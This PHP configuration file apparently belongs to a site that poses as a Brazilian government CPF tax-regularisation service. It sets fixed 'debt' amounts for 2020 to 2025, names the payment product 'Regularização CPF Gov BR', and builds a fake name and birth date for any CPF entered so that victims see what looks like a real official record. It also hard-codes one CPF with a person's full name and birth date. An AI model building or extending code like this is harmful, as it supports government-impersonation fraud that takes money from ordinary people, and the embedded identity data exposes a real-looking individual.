<?php
// Configurações Globais do Site de Reconstrução Fiscal

// Valores de débito para cada ano (em centavos)
define('VALOR_2020', 9401);  // R$ 94,01 (Obrigatório)
define('VALOR_2021', 8343);  // R$ 83,43
define('VALOR_2022', 9125);  // R$ 91,25
define('VALOR_2023', 9987);  // R$ 99,87
define('VALOR_2024', 10845); // R$ 108,45
define('VALOR_2025', 12458); // R$ 124,58

// Nome do Produto a ser exibido no gateway
define('PRODUTO_NOME', 'Regularização CPF Gov BR');

/**
 * Função para obter dados fictícios com base no CPF (apenas números).
 * Usa hash determinístico (crc32 + md5) para garantir resultados consistentes
 * em qualquer ambiente serverless, sem depender de srand/rand.
 */
function obterDadosCPF($cpf_limpo) {
    // CPF de teste original
    if ($cpf_limpo === '46620588808' || $cpf_limpo === '466.205.888-08') {
        return [
            'nome'       => 'Caique Dos Santos Pires',
            'nascimento' => '09/11/2004'
        ];
    }

    // Listas para geração determinística
    $primeiros_nomes = [
        'José', 'Maria', 'João', 'Ana', 'Antônio', 'Francisco',
        'Carlos', 'Paulo', 'Lucas', 'Luiz', 'Marcos', 'Juliana',
        'Fernanda', 'Patrícia', 'Camila', 'Aline', 'Sandra',
        'Roberto', 'Anderson', 'Bruno'
    ];
    $sobrenomes = [
        'Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira',
        'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro',
        'Martins', 'Carvalho', 'Almeida', 'Lopes', 'Soares', 'Dias',
        'Vieira', 'Rocha'
    ];

    $n = count($primeiros_nomes);
    $s = count($sobrenomes);

    // Gera hashes independentes para cada campo usando o CPF completo como chave
    $h1 = abs(crc32($cpf_limpo . 'nome1'));
    $h2 = abs(crc32($cpf_limpo . 'sobrenome1'));
    $h3 = abs(crc32($cpf_limpo . 'sobrenome2'));
    $hd = abs(crc32($cpf_limpo . 'dia'));
    $hm = abs(crc32($cpf_limpo . 'mes'));
    $ha = abs(crc32($cpf_limpo . 'ano'));

    $nome1 = $primeiros_nomes[$h1 % $n];
    $nome2 = $sobrenomes[$h2 % $s];
    $nome3 = $sobrenomes[$h3 % $s];

    $dia = str_pad(($hd % 28) + 1, 2, '0', STR_PAD_LEFT);
    $mes = str_pad(($hm % 12) + 1, 2, '0', STR_PAD_LEFT);
    $ano = 1965 + ($ha % 41); // 1965–2005

    return [
        'nome'       => "$nome1 $nome2 $nome3",
        'nascimento' => "$dia/$mes/$ano"
    ];
}
